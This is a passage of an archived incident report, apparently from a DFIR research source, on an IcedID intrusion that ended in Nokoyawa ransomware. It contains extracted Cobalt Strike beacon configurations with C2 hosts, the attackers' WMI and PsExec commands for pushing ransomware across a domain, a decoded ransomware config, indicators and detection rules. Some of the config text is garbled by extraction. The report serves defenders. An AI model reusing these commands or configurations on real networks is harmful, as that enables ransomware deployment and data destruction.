\"tcp_frame_header\":\n\"AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\n  \"crypto_scheme\": 0,\n\n  \"proxy\": {\n\n    \"type\": null,\n\n    \"username\": null,\n\n    \"password\": null,\n\n    \"behavior\": \"Use IE settings\"\n\n  },\n\n  \"http_post_chunk\": 0,\n\n  \"uses_cookies\": true,\n\n  \"post-ex\": {\n\n    \"spawnto_x86\": \"%windir%\\\\syswow64\\\\regsvr32.exe\",\n\n    \"spawnto_x64\": \"%windir%\\\\sysnative\\\\regsvr32.exe\"\n\n  },\n\n  \"process-inject\": {\n\n    \"allocator\": \"VirtualAllocEx\",\n\n    \"execute\": [\n\n      \"CreateThread\",\n\n      \"RtlCreateUserThread\",\n\n      \"CreateRemoteThread\"\n\n    ],\n\n    \"min_alloc\": 6133,\n\n    \"startrwx\": false,\n\n    \"stub\": \"tUr+Aexqde3zXhpE+L05KQ==\",\n\n    \"transform-x86\": [\n\n      \"prepend '\\\\x90\\\\x90\\\\x90\\\\x90\\\\x90\\\\x90'\"\n\n    ],\n\n    \"transform-x64\": [\n\n      \"prepend '\\\\x90\\\\x90\\\\x90\\\\x90\\\\x90\\\\x90'\"\n\n    ],\n\n    \"userwx\": false\n\n  }\n\n```\n\n-----\n\n```\n    \"dns_idle\": null,\n\n    \"dns_sleep\": null,\n\n    \"maxdns\": null,\n\n    \"beacon\": null,\n\n    \"get_A\": null,\n\n    \"get_AAAA\": null,\n\n    \"get_TXT\": null,\n\n    \"put_metadata\": null,\n\n    \"put_output\": null\n\n  },\n\n  \"pipename\": null,\n\n  \"smb_frame_header\":\n\"AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\n  \"stage\": {\n\n    \"cleanup\": true\n\n  },\n\n  \"ssh\": {\n\n    \"hostname\": null,\n\n    \"port\": null,\n\n    \"username\": null,\n\n    \"password\": null,\n\n    \"privatekey\": null\n\n  }\n\n}\n\n```\nDomain IP Port JA3 JA3s\n\niconnectgs[.]com 50.3.132.232 8081 N/A N/A\n\n\n-----\n\n```\n \"spawnto\": \"AAAAAAAAAAAAAAAAAAAAAA\\u003d\\u003d\",\n\n \"pipename\": null,\n\n \"dns_beacon\": {\n\n  \"put_metadata\": null,\n\n  \"get_TXT\": null,\n\n  \"get_AAAA\": null,\n\n  \"get_A\": null,\n\n  \"beacon\": null,\n\n  \"maxdns\": null,\n\n  \"dns_sleep\": null,\n\n  \"put_output\": null,\n\n  \"dns_idle\": null\n\n },\n\n \"smb_frame_header\":\n\"AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\n \"post_ex\": {\n\n  \"spawnto_x64\": \"%windir%\\\\sysnative\\\\svchost.exe\",\n\n  \"spawnto_x86\": \"%windir%\\\\syswow64\\\\svchost.exe\"\n\n },\n\n \"stage\": {\n\n  \"cleanup\": \"true\"\n\n },\n\n \"process_inject\": {\n\n  \"stub\": \"snNvHLupDUIob8Qr+6dPTQ\\u003d\\u003d\",\n\n  \"transform_x64\": [\"prepend \\u0027\\\\x90\\\\x90\\\\x90\\\\x90\\u0027\"],\n\n  \"transform_x86\": [\"prepend \\u0027\\\\x90\\\\x90\\\\x90\\\\x90\\u0027\"],\n\n  \"startrwx\": \"false\",\n\n  \"min_alloc\": \"5271\",\n\n  \"userwx\": \"false\",\n\n  \"execute\": [\"CreateThread\", \"RtlCreateUserThread\", \"CreateRemoteThread\"],\n\n  \"allocator\": \"VirtualAllocEx\"\n\n },\n\n \"uses_cookies\": \"true\",\n\n \"http_post_chunk\": \"0\",\n\n \"ssh\": {\n\n  \"privatekey\": null,\n\n  \"username\": null,\n\n  \"password\": null,\n\n  \"port\": null,\n\n  \"hostname\": null\n\n },\n\n \"useragent_header\": null,\n\n \"maxgetsize\": \"1864478\",\n\n \"proxy\": {\n\n  \"behavior\": \"Use IE settings\",\n\n  \"password\": null,\n\n  \"username\": null,\n\n  \"type\": null\n\n },\n\n \"tcp_frame_header\":\n\"AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\n \"server\": {\n\n  \"publickey\":\n\"MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCrr8AvQMH9nOuqc7x6r58gsuNMYuuRdKcMgo3iPMjQgM1u5BNXqKJBnOPlz6j+wbv+L9/BM6+oKDxxXEzsEMHxGaD49lX\n\n  \"port\": \"8081\",\n\n  \"hostname\": \"iconnectgs.com\"\n\n },\n\n \"beacontype\": [\"HTTP\"],\n\n \"kill_date\": null,\n\n \"license_id\": \"0\",\n\n \"jitter\": \"43\",\n\n \"sleeptime\": \"62004\",\n\n \"http_get\": {\n\n  \"server\": {\n\n   \"output\": [\"print\", \"prepend 338 characters\", \"base64\", \"base64\"]\n\n  },\n\n  \"client\": {\n\n   \"metadata\": [],\n\n   \"headers\": []\n\n  },\n\n  \"verb\": \"GET\",\n\n  \"uri\": \"/hr\"\n\n },\n\n \"cfg_caution\": \"false\",\n\n \"h h d \" \"\"\n\n```\n\n-----\n\n```\n \"http_post\": {\n\n  \"client\": {\n\n   \"output\": [],\n\n   \"id\": [],\n\n   \"headers\": []\n\n  },\n\n  \"verb\": \"POST\",\n\n  \"uri\": \"/mobile-home\"\n\n }\n\n}, {\n\n \"spawnto\": \"AAAAAAAAAAAAAAAAAAAAAA\\u003d\\u003d\",\n\n \"pipename\": null,\n\n \"dns_beacon\": {\n\n  \"put_metadata\": null,\n\n  \"get_TXT\": null,\n\n  \"get_AAAA\": null,\n\n  \"get_A\": null,\n\n  \"beacon\": null,\n\n  \"maxdns\": null,\n\n  \"dns_sleep\": null,\n\n  \"put_output\": null,\n\n  \"dns_idle\": null\n\n },\n\n \"smb_frame_header\":\n\"AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\n \"post_ex\": {\n\n  \"spawnto_x64\": \"%windir%\\\\sysnative\\\\svchost.exe\",\n\n  \"spawnto_x86\": \"%windir%\\\\syswow64\\\\svchost.exe\"\n\n },\n\n \"stage\": {\n\n  \"cleanup\": \"true\"\n\n },\n\n \"process_inject\": {\n\n  \"stub\": \"snNvHLupDUIob8Qr+6dPTQ\\u003d\\u003d\",\n\n  \"transform_x64\": [\"prepend \\u0027\\\\x90\\\\x90\\\\x90\\\\x90\\u0027\"],\n\n  \"transform_x86\": [\"prepend \\u0027\\\\x90\\\\x90\\\\x90\\\\x90\\u0027\"],\n\n  \"startrwx\": \"false\",\n\n  \"min_alloc\": \"5271\",\n\n  \"userwx\": \"false\",\n\n  \"execute\": [\"CreateThread\", \"RtlCreateUserThread\", \"CreateRemoteThread\"],\n\n  \"allocator\": \"VirtualAllocEx\"\n\n },\n\n \"uses_cookies\": \"true\",\n\n \"http_post_chunk\": \"0\",\n\n \"ssh\": {\n\n  \"privatekey\": null,\n\n  \"username\": null,\n\n  \"password\": null,\n\n  \"port\": null,\n\n  \"hostname\": null\n\n },\n\n \"useragent_header\": null,\n\n \"maxgetsize\": \"1864478\",\n\n \"proxy\": {\n\n  \"behavior\": \"Use IE settings\",\n\n  \"password\": null,\n\n  \"username\": null,\n\n  \"type\": null\n\n },\n\n \"tcp_frame_header\":\n\"AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\n \"server\": {\n\n  \"publickey\":\n\"MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCrr8AvQMH9nOuqc7x6r58gsuNMYuuRdKcMgo3iPMjQgM1u5BNXqKJBnOPlz6j+wbv+L9/BM6+oKDxxXEzsEMHxGaD49lX\n\n  \"port\": \"8081\",\n\n  \"hostname\": \"iconnectgs.com\"\n\n },\n\n \"beacontype\": [\"HTTP\"],\n\n \"kill_date\": null,\n\n \"license_id\": \"0\",\n\n \"jitter\": \"43\",\n\n \"sleeptime\": \"62004\",\n\n \"http_get\": {\n\n  \"server\": {\n\n    \" \" [\" i \" \" d h \" \"b \" \"b \"]\n\n```\n\n-----\n\n```\n  \"client\": {\n\n   \"metadata\": [],\n\n   \"headers\": []\n\n  },\n\n  \"verb\": \"GET\",\n\n  \"uri\": \"/hr\"\n\n },\n\n \"cfg_caution\": \"false\",\n\n \"host_header\": \"\",\n\n \"crypto_scheme\": \"0\",\n\n \"http_post\": {\n\n  \"client\": {\n\n   \"output\": [],\n\n   \"id\": [],\n\n   \"headers\": []\n\n  },\n\n  \"verb\": \"POST\",\n\n  \"uri\": \"/mobile-home\"\n\n }\n\n}]\n\n```\nDomain IP Port JA3 JA3s\n\nN/A 5.8.18.242 443 72a589da586844d7f0818ce684948eea f176ba63b4d68e576b5ba345bec2c7b7\n\n\n-----\n\n```\n \"spawnto\": \"AAAAAAAAAAAAAAAAAAAAAA\\u003d\\u003d\",\n\n \"pipename\": null,\n\n \"dns_beacon\": {\n\n  \"put_metadata\": null,\n\n  \"get_TXT\": null,\n\n  \"get_AAAA\": null,\n\n  \"get_A\": null,\n\n  \"beacon\": null,\n\n  \"maxdns\": null,\n\n  \"dns_sleep\": null,\n\n  \"put_output\": null,\n\n  \"dns_idle\": null\n\n },\n\n \"smb_frame_header\":\n\"AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\n \"post_ex\": {\n\n  \"spawnto_x64\": \"%windir%\\\\sysnative\\\\rundll32.exe\",\n\n  \"spawnto_x86\": \"%windir%\\\\syswow64\\\\rundll32.exe\"\n\n },\n\n \"stage\": {\n\n  \"cleanup\": \"false\"\n\n },\n\n \"process_inject\": {\n\n  \"stub\": \"tUr+Aexqde3zXhpE+L05KQ\\u003d\\u003d\",\n\n  \"transform_x64\": [],\n\n  \"transform_x86\": [],\n\n  \"startrwx\": \"true\",\n\n  \"min_alloc\": \"0\",\n\n  \"userwx\": \"true\",\n\n  \"execute\": [\"CreateThread\", \"SetThreadContext\", \"CreateRemoteThread\", \"RtlCreateUserThread\"],\n\n  \"allocator\": \"VirtualAllocEx\"\n\n },\n\n \"uses_cookies\": \"true\",\n\n \"http_post_chunk\": \"0\",\n\n \"ssh\": {\n\n  \"privatekey\": null,\n\n  \"username\": null,\n\n  \"password\": null,\n\n  \"port\": null,\n\n  \"hostname\": null\n\n },\n\n \"useragent_header\": null,\n\n \"maxgetsize\": \"1048576\",\n\n \"proxy\": {\n\n  \"behavior\": \"Use IE settings\",\n\n  \"password\": null,\n\n  \"username\": null,\n\n  \"type\": null\n\n },\n\n \"tcp_frame_header\":\n\"AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\n \"server\": {\n\n  \"publickey\":\n\"MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCnOM3nXx+7HBhkbDd+AwFrFisSunK999w2tM0uTpuuEiBalcJhcL+QgQWtf6S7zPp5hjImG+2YcPl18geU4f5JlSPXHwi\n\n  \"port\": \"80\",\n\n  \"hostname\": \"5.8.18.242\"\n\n },\n\n \"beacontype\": [\"HTTP\"],\n\n \"kill_date\": null,\n\n \"license_id\": \"305419776\",\n\n \"jitter\": \"0\",\n\n \"sleeptime\": \"60000\",\n\n \"http_get\": {\n\n  \"server\": {\n\n   \"output\": [\"print\"]\n\n  },\n\n  \"client\": {\n\n   \"metadata\": [],\n\n   \"headers\": []\n\n  },\n\n  \"verb\": \"GET\",\n\n  \"uri\": \"/pixel.gif\"\n\n },\n\n \"cfg_caution\": \"false\",\n\n \"h h d \" \"\"\n\n```\n\n-----\n\n```\n \"http_post\": {\n\n  \"client\": {\n\n   \"output\": [],\n\n   \"id\": [],\n\n   \"headers\": []\n\n  },\n\n  \"verb\": \"POST\",\n\n  \"uri\": \"/submit.php\"\n\n }\n\n}, {\n\n \"spawnto\": \"AAAAAAAAAAAAAAAAAAAAAA\\u003d\\u003d\",\n\n \"pipename\": null,\n\n \"dns_beacon\": {\n\n  \"put_metadata\": null,\n\n  \"get_TXT\": null,\n\n  \"get_AAAA\": null,\n\n  \"get_A\": null,\n\n  \"beacon\": null,\n\n  \"maxdns\": null,\n\n  \"dns_sleep\": null,\n\n  \"put_output\": null,\n\n  \"dns_idle\": null\n\n },\n\n \"smb_frame_header\":\n\"AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\n \"post_ex\": {\n\n  \"spawnto_x64\": \"%windir%\\\\sysnative\\\\rundll32.exe\",\n\n  \"spawnto_x86\": \"%windir%\\\\syswow64\\\\rundll32.exe\"\n\n },\n\n \"stage\": {\n\n  \"cleanup\": \"false\"\n\n },\n\n \"process_inject\": {\n\n  \"stub\": \"tUr+Aexqde3zXhpE+L05KQ\\u003d\\u003d\",\n\n  \"transform_x64\": [],\n\n  \"transform_x86\": [],\n\n  \"startrwx\": \"true\",\n\n  \"min_alloc\": \"0\",\n\n  \"userwx\": \"true\",\n\n  \"execute\": [\"CreateThread\", \"SetThreadContext\", \"CreateRemoteThread\", \"RtlCreateUserThread\"],\n\n  \"allocator\": \"VirtualAllocEx\"\n\n },\n\n \"uses_cookies\": \"true\",\n\n \"http_post_chunk\": \"0\",\n\n \"ssh\": {\n\n  \"privatekey\": null,\n\n  \"username\": null,\n\n  \"password\": null,\n\n  \"port\": null,\n\n  \"hostname\": null\n\n },\n\n \"useragent_header\": null,\n\n \"maxgetsize\": \"1048576\",\n\n \"proxy\": {\n\n  \"behavior\": \"Use IE settings\",\n\n  \"password\": null,\n\n  \"username\": null,\n\n  \"type\": null\n\n },\n\n \"tcp_frame_header\":\n\"AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\n \"server\": {\n\n  \"publickey\":\n\"MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCnOM3nXx+7HBhkbDd+AwFrFisSunK999w2tM0uTpuuEiBalcJhcL+QgQWtf6S7zPp5hjImG+2YcPl18geU4f5JlSPXHwi\n\n  \"port\": \"443\",\n\n  \"hostname\": \"5.8.18.242\"\n\n },\n\n \"beacontype\": [\"HTTPS\"],\n\n \"kill_date\": null,\n\n \"license_id\": \"305419776\",\n\n \"jitter\": \"0\",\n\n \"sleeptime\": \"60000\",\n\n \"http_get\": {\n\n  \"server\": {\n\n    \" \" [\" i \"]\n\n```\n\n-----\n\n```\n  \"client\": {\n\n   \"metadata\": [],\n\n   \"headers\": []\n\n  },\n\n  \"verb\": \"GET\",\n\n  \"uri\": \"/dot.gif\"\n\n },\n\n \"cfg_caution\": \"false\",\n\n \"host_header\": \"\",\n\n \"crypto_scheme\": \"0\",\n\n \"http_post\": {\n\n  \"client\": {\n\n   \"output\": [],\n\n   \"id\": [],\n\n   \"headers\": []\n\n  },\n\n  \"verb\": \"POST\",\n\n  \"uri\": \"/submit.php\"\n\n }\n\n}]\n\n## Exfiltration\n\n```\nDuring the intrusion, the threat actors targeted password documents on network shares. We observed these being taken and opened off\nnetwork through the use of canaries. No overt exfiltration was observed so we assess that this occurred over existing command and control\nchannels.\n\nThe threat actors opened the document from the IP:\n```\n45.61.139.126\n\n\n## Impact\n\n```\nThreat Actors deployed Nokoyawa ransomware from one of the servers using WMI and PsExec. They first copied the ransomware\nbinary,k.exe, and a batch script p.bat using WMI:\n```\nwmic /node:\"TARGET_HOST_IP\" /user:\"DOMAIN\\USER\" /password:\"PASSWORD\" process call create \"cmd.exe /c copy\n\\\\SOURCE_SERVER_IP\\c$\\windows\\temp\\p.bat c:\\windows\\temp\\\"\n\n\n```\nCommand spawned by WmiPrvSE.exe:\n```\ncmd.exe /c copy \\\\SOURCE_SERVER_IP\\c$\\windows\\temp\\k.exe c:\\windows\\temp\\\n\n\n```\nA snippet of SMB network traffic generated by the above command:\n\nThe p.bat is a simple batch script that runs the k.exe binary with a Base64 encoded configuration:\n```\nc:\\windows\\temp\\k.exe --config REDACTED\n\n\n```\nThe redacted parameter used by the `–config` flag decodes to:\n\n\n-----\n\n```\n\"lHrYQm+P3IbmyjTop2FK0qUdwOcSgHuFiT+r77bT4w0=\", \"SKIP_DIRS\": [\"windows\", \"program files\", \"program files (x86)\", \"appdata\",\n\"programdata\", \"system volume information\", \"\"], \"SKIP_EXTS\": [\".exe\", \".dll\", \".ini\", \".lnk\", \".url\", \"\"], \"ENCRYPT_NETWORK\":\ntrue, \"LOAD_HIDDEN_DRIVES\": true, \"DELETE_SHADOW\": true}\n\n```\nThe decoded configuration file shows the ransomware extension, the note name, and the note content encoded in Base64. The threat actors\nalso configured a number of directories and extensions to skip, and enabled network and hidden drives encryption. The DELETE_SHADOW\nwas set to true, in order to delete volume shadow copies.\n\nBased on the configuration parameters being passed via command line and the code written in C++, the deployment appears to be part of the\n[1.1 version of the Nokoyawa code base:](https://www.zscaler.com/blogs/security-research/nevada-ransomware-yet-another-nokoyawa-variant)\n\nRansomware sample code signature:\n\n\n-----\n\nDebug information shows that the binary was generated a few hours before the encryption:\n\nThe ransomware was then deployed at scale using PsExec to encrypt the Windows domain:\n```\npsexec.exe \\\\TARGET_HOST_IP -u DOMAIN\\USER -p \"PASSWORD\" -s -d -h -r mstdc -accepteula -nobanner c:\\windows\\temp\\p.bat\n\n```\n\n-----\n\nA ransom message was left in each directory where files were encrypted.\n\nAfter encryption, contact was made with the threat actors using their support site and the price of the ransom was quoted at ~$200,000 USD in\nBitcoin. No ransom was paid as a result of this intrusion.\n\n## Timeline\n\n\n-----\n\n-----\n\n## Diamond Model\n\n Indicators\n\n### Atomic\n```\nCobalt Strike\n\n50.3.132[.]232:8081 / iconnectgs[.]com\n\n5.8.18[.]242:443\n\n23.29.115[.]152:757 / aicsoftware[.]com\n\n23.29.115[.]152:8080 / aicsoftware[.]com\n\nPowershell Cobalt Strike Downloader\n\nhttps://aicsoftware[.]com:757/coin\n\nIcedID Excel Download URL\n\nhttps://simipimi[.]com\n\nIcedID C2\n\nkicknocisd[.]com\n\n159.65.169[.]200\n\n45.66.248[.]119:443 / guaracheza[.]pics | belliecow[.]wiki\n\n198.244.180.66:443 / curabiebarristie[.]com | stayersa[.]art\n\nBackConnect\n\n137.74.104[.]108:8080\n\n Computed\n\n```\n\n-----\n\n```\nb5db398832461be8d93fdbda120088aa \n\nb36748a27b8e68710701286106ad434c9afea6fa \n\n30a334da51d22b2fe6e33970df8d0f81396394de9d3a3c224751aacb2202b0db \n\n1.dll\n\n9740f2b8aeacc180d32fc79c46333178 \n\nc599c32d6674c01d65bff6c7710e94b6d1f36869 \n\nd3db55cd5677b176eb837a536b53ed8c5eabbfd68f64b88dd083dc9ce9ffb64e \n\n4_202210250456866742.xls\n\nd3032968085db665381d9cbd3569f330 \n\n9230520c6dd215e2152bb2e56b2a5d6b45ae8e13 \n\neb84a283ff58906786d63ffe43a8ff2728584428f5f7d9972c664f63f8790113 \n\n7030270\n\n964c94b217d102e53a227bcbc94ae52e \n\nb846e89d0f56851696d50b5e64c6e758ddae3e6a \n\n091886c95ca946aedee24b7c751b5067c5ac875923caba4d3cc9d961efadb65d\n\nk.exe\n\n40c9dc2897b6b348da88b23deb0d3952 \n\n0f5457b123e60636623f585cc2bf2729f13a95d6 \n\n7095beafff5837070a89407c1bf3c6acf8221ed786e0697f6c578d4c3de0efd6 \n\nmstdc.exe\n\n7dae150c1df0e01467be3a743775b646\n\nf309b61a8b005b5ce0a3fb58caaa798cfc95f5db \n\n3c19fee379b4882971834a3d38f3f8b86de560114274375560433778cd505748 \n\np.bat\n\n385d21c0438f5b21920aa9eb894740d2 \n\n5d2c17799dfc6717f89cd5f63951829aed038041 \n\ne351ba5e50743215e8e99b5f260671ca8766886f69d84eabb83e99d55884bc2f \n\n## Detections\n\n### Network\nET MALWARE Win32/IcedID Request Cookie\n\nET POLICY OpenSSL Demo CA - Internet Widgits Pty (O)\n\nNF - Malware IcedID BackConnect - Wait Command\n\nNF - Malware IcedID BackConnect - Start VNC command - 11\n\nET MALWARE Meterpreter or Other Reverse Shell SSL Cert\n\nET HUNTING Suspicious Empty SSL Certificate - Observed in Cobalt Strike\n\nET MALWARE Cobalt Strike Malleable C2 Profile (__session__id Cookie)\n\nET SCAN Behavioral Unusual Port 1433 traffic Potential Scan or Infection\n\nET POLICY SMB2 NT Create AndX Request For an Executable File\n\nET RPC DCERPC SVCCTL - Remote Service Control Manager Access\n\nET POLICY PsExec service created\n\nET POLICY SMB Executable File Transfer\n\nET POLICY SMB2 NT Create AndX Request For a .bat File\n\nET POLICY SMB2 NT Create AndX Request For a DLL File - Possible Lateral Movement\n\n Sigma\n\n```\n[SIGMA Project Repo](https://github.com/SigmaHQ/sigma)\n\nNew Process Created Via Wmic.EXE id: 526be59f-a573-4eea-b5f7-f0973207634d\n\nPotential Recon Activity Via Nltest.EXE id: 5cc90652-4cbd-4241-aa3b-4b462fa5a248\n\nCreated Files by Office Applications id: c7a74c80-ba5a-486e-9974-ab9e682bc5e4\n\nCobaltStrike Named Pipe id: d5601f8c-b26f-4ab0-9035-69e11a8d4ad2\n\nSuspicious Group And Account Reconnaissance Activity Using Net.EXE id: d95de845-b83c-4a9a-8a6a-4fc802ebf6c0\n\nPowerShell Download and Execution Cradles id: 85b0b087-eddf-4a2b-b033-d771fa2b9775\n\nMeterpreter or Cobalt Strike Getsystem Service Installation – Security id: ecbc5e16-58e0-4521-9c60-eb9a7ea4ad34\n\nCredential Dumping Tools Accessing LSASS Memory id: 32d0d3e2-e58d-4d41-926b-18b520b2b32d\n\nPotential Defense Evasion Via Rename Of Highly Relevant Binaries id: 0ba1da6d-b6ce-4366-828c-18826c9de23e\n\n\n-----\n\n[epo t](https://github.com/The-DFIR-Report/Sigma-Rules) epo\n\nAdFind Discovery id: 50046619-1037-49d7-91aa-54fc92923604\n\nCHCP CodePage Locale Lookup id: dfbdd206-6cf2-4db9-93a6-0b7e14d5f02f\n\n### Yara\n\n[https://github.com/The-DFIR-Report/Yara-Rules/blob/main/18190/18190.yar](https://github.com/The-DFIR-Report/Yara-Rules/blob/main/18190/18190.yar)\n\n### MITRE\n\n\n-----\n\n-----\n\n```\nAccess Token Manipulation: Token Impersonation/Theft - T1134.001\nAccount Discovery: Local Account - T1087.001\nAccount Discovery: Domain Account - T1087.002\nApplication Layer Protocol: Web Protocols - T1071.001\nCommand and Scripting Interpreter: Windows Command Shell - T1059.003\nCommand-Line Interface: PowerShell - T1059.001\nCommand-Line Interface: Visual Basic - T1059.005\nData Encrypted for Impact - T1486\nDomain Trust Discovery - T1482\nFile and Directory Discovery - T1083\nIndicator Removal on Host: File Deletion - T1070.004\nMasquerading: Rename System Utilities - T1036.003\nPhishing: Spearphishing Attachment - T1566.001\nProcess Injection – T1055\nRemote Services: RDP - T1021.001\nRemote Services: SMB/Windows Admin Shares - T1021.002\nRemote System Discovery - T1018\nScheduled Task/Job: Scheduled Task - T1053.005\nSystem Binary Proxy Execution: Rundll32 - T1218.011\nSystem Network Configuration Discovery - T1016\nValid Accounts - T1078\nWMI - T1047\nUnsecured Credentials: Credentials In Files - T1552.001\nUser Execution: Malicious File - T1204.002\nRemote Services: Windows Remote Management - T1021.006\nExfiltration Over C2 Channel - T1041\nArchive Collected Data: Archive via Utility - T1560.001\nIngress Tool Transfer - T1105\nWeb Service - T1102\nOS Credential Dumping: LSASS Memory - T1003.001\nRemote Access Software - T1219\nAdFind - S0552\nIcedID - S0483\nipconfig - S0100\nnet - S0039\nnltest - S0359\nping - S0097\nsysteminfo - S0096\ncmd - S0106\nCobalt Strike - S0154\nPsExec - S0029\n\n```\nInternal case #18190\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2023/2023-05-22 - IcedID Macro Ends in Nokoyawa Ransomware.pdf"
    ],
    "report_names": [
        "2023-05-22 - IcedID Macro Ends in Nokoyawa Ransomware.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "20c759c2-cd02-45bb-85c6-41bde9e6a7cf",
            "created_at": "2024-01-18T02:02:34.189827Z",
            "updated_at": "2025-03-27T02:02:09.937024Z",
            "deleted_at": null,
            "main_name": "HomeLand Justice",
            "aliases": [
                "Karma",
                "Storm-842",
                "Void Manticore"
            ],
            "source_name": "ETDA:HomeLand Justice",
            "tools": [
                "BABYWIPER",
                "BiBi Wiper",
                "BiBi-Linux Wiper",
                "BiBi-Windows Wiper",
                "Cl Wiper",
                "LowEraser",
                "No-Justice Wiper",
                "Plink",
                "PuTTY Link",
                "RevSocks",
                "W2K Res Kit"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1685930791,
    "ts_updated_at": 1743041364,
    "ts_creation_date": 1685883274,
    "ts_modification_date": 1685883274,
    "files": {
        "pdf": "https://archive.orkl.eu/468f8adaa251235678963c0828f45eb41a810a95.pdf",
        "text": "https://archive.orkl.eu/468f8adaa251235678963c0828f45eb41a810a95.txt",
        "img": "https://archive.orkl.eu/468f8adaa251235678963c0828f45eb41a810a95.jpg"
    }
}